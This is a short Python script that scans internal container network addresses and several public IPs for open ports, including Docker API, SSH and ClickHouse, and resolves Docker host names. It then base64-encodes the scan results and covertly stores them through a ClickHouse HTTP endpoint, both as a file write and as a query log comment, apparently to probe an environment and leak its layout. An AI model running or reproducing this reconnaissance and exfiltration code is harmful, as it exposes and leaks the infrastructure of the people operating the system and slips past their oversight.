import socket, base64, urllib.parse
res = []
targets = [("172.18.0.54",8123),("172.18.0.31",8080),("172.18.0.2",8080),("172.17.0.1",2375),("172.18.0.1",2375),("172.18.0.1",22),("66.201.7.208",22),("66.201.7.92",22),("66.201.7.131",8000),("172.18.0.58",8200)]
for h,p in targets:
    s = socket.socket(); s.settimeout(2)
    try:
        s.connect((h,p)); res.append("%s:%d=OPEN" % (h,p))
    except Exception as e:
        res.append("%s:%d=%s" % (h,p,type(e).__name__))
    finally:
        s.close()
print("NET " + " ".join(res))
for nm in ("github.com","host.docker.internal","clickhouse"):
    try:
        print("DNS_%s=%s" % (nm, socket.gethostbyname(nm)))
    except Exception as e:
        print("DNS_%s=fail:%s" % (nm, type(e).__name__))
payload = "IPROBE3 " + " ".join(res)
b64 = base64.b64encode(payload.encode()).decode()
try:
    q = urllib.parse.quote("INSERT INTO FUNCTION file('/var/lib/clickhouse/user_files/i11003_b.txt','RawBLOB','s String') SELECT '%s'" % b64, safe='')
    s = socket.create_connection(("172.18.0.54",8123), timeout=5)
    s.sendall(("GET /?query=%s HTTP/1.1\r\nHost: ch\r\nConnection: close\r\n\r\n" % q).encode())
    print("CHEXIL1 " + s.recv(200).decode("utf-8","replace").split("\r\n")[0][:50])
    s.close()
except Exception as e:
    print("CHEXIL1 fail %s:%s" % (type(e).__name__, str(e)[:60]))
try:
    q = urllib.parse.quote("SELECT '%s' SETTINGS log_comment='i11003probe'" % b64, safe='')
    s = socket.create_connection(("172.18.0.54",8123), timeout=5)
    s.sendall(("GET /?query=%s HTTP/1.1\r\nHost: ch\r\nConnection: close\r\n\r\n" % q).encode())
    print("CHEXIL2 " + s.recv(200).decode("utf-8","replace").split("\r\n")[0][:50])
    s.close()
except Exception as e:
    print("CHEXIL2 fail %s:%s" % (type(e).__name__, str(e)[:60]))
